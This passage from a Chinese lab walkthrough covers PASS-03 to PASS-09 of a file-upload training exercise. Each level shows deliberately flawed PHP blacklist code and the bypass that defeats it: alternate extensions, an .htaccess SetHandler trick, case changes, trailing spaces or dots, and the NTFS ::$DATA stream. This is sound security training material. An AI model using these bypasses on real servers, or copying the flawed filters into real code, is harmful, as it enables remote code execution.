<h1 id="PASS-03（黑名单绕过）"><a href="#PASS-03（黑名单绕过）" class="headerlink" title="PASS-03（黑名单绕过）"></a>PASS-03（黑名单绕过）</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务器端检测asp、aspx、php、jsp</p>
<h2 id="2-绕过方法"><a href="#2-绕过方法" class="headerlink" title="2.绕过方法"></a>2.绕过方法</h2><p>除了以上四个后缀不能上传，我们可以上传其他任意后缀，比如：.phtml .phps ,.php3.php5 .pht。所以，将文件后缀名改为php3开始上传。</p>
<h1 id="PASS-04（-htaccess绕过）"><a href="#PASS-04（-htaccess绕过）" class="headerlink" title="PASS-04（.htaccess绕过）"></a>PASS-04（.htaccess绕过）</h1><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="1.分析"></a>1.分析</h2><p>黑名单限制了更多的后缀不允许上传，但是并没有限制.htaccess文件。</p>
<h2 id="2-htaccess文件"><a href="#2-htaccess文件" class="headerlink" title="2.htaccess文件"></a>2.htaccess文件</h2><p>这类文件是apache服务器的一个配置文件，他负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p>
<h2 id="3-绕过方法"><a href="#3-绕过方法" class="headerlink" title="3.绕过方法"></a>3.绕过方法</h2><p>1.首先上传一个内容为<code>SetHandler application/x-httpd-php</code>的.htaccess文件，让之后上传的所有文件解析成php文件。</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DVARsI.jpg" alt="DVARsI.jpg"></p>
<p>2.之后开始上传php文件</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DVAWLt.jpg" alt="DVAWLt.jpg" style="zoom:67%;" /></p>
<h1 id="PASS-05（大小写绕过）"><a href="#PASS-05（大小写绕过）" class="headerlink" title="PASS-05（大小写绕过）"></a>PASS-05（大小写绕过）</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看源码还是黑名单限制，也加上了.htaccess，但是没有将后缀大小写统一，所以大小写绕过</p>
<h2 id="2-绕过方法-1"><a href="#2-绕过方法-1" class="headerlink" title="2.绕过方法"></a>2.绕过方法</h2><p>将文件后缀改换大小写</p>
<h1 id="PASS-06（空格绕过）"><a href="#PASS-06（空格绕过）" class="headerlink" title="PASS-06（空格绕过）"></a>PASS-06（空格绕过）</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-绕过方法-2"><a href="#2-绕过方法-2" class="headerlink" title="2.绕过方法"></a>2.绕过方法</h2><p>黑名单中添加了更多的后缀名，但是没有对后缀名去除空格，所以可以才后缀名中添加空格。</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DVmGvQ.jpg" alt="DVmGvQ.jpg" style="zoom:67%;" /></p>
<h1 id="PASS-07（点绕过）"><a href="#PASS-07（点绕过）" class="headerlink" title="PASS-07（点绕过）"></a>PASS-07（点绕过）</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码上看，虽然加上了首位去空，但是缺少尾部去点，因此可以利用windows文件命名规则绕过。</p>
<h2 id="2-绕过方法-3"><a href="#2-绕过方法-3" class="headerlink" title="2.绕过方法"></a>2.绕过方法</h2><p>burpsuite中改包加上.</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DVm8gg.jpg" alt="DVm8gg.jpg" style="zoom:67%;" /></p>
<h1 id="PASS-08（-DATA绕过）"><a href="#PASS-08（-DATA绕过）" class="headerlink" title="PASS-08（::$DATA绕过）"></a>PASS-08（::$DATA绕过）</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依然是黑名单，但是没有对后缀名去“::$DATA”处理，利用windows特性，在后缀名中加上“::$DATA”绕过。</p>
<h2 id="2-DATA为什么能绕过"><a href="#2-DATA为什么能绕过" class="headerlink" title="2.DATA为什么能绕过"></a>2.DATA为什么能绕过</h2><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$<br>DATA。<br>简单讲就是在php+windows的情况下：如果文件名+”::$DATA” 会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<h2 id="3-绕过方法-1"><a href="#3-绕过方法-1" class="headerlink" title="3.绕过方法"></a>3.绕过方法</h2><p>使用burpsuite改包，在后缀名中加上”::$DATA”</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DV4eQ1.jpg" alt="DV4eQ1.jpg"></p>
<h1 id="PASS-09（点空格点绕过）"><a href="#PASS-09（点空格点绕过）" class="headerlink" title="PASS-09（点空格点绕过）"></a>PASS-09（点空格点绕过）</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
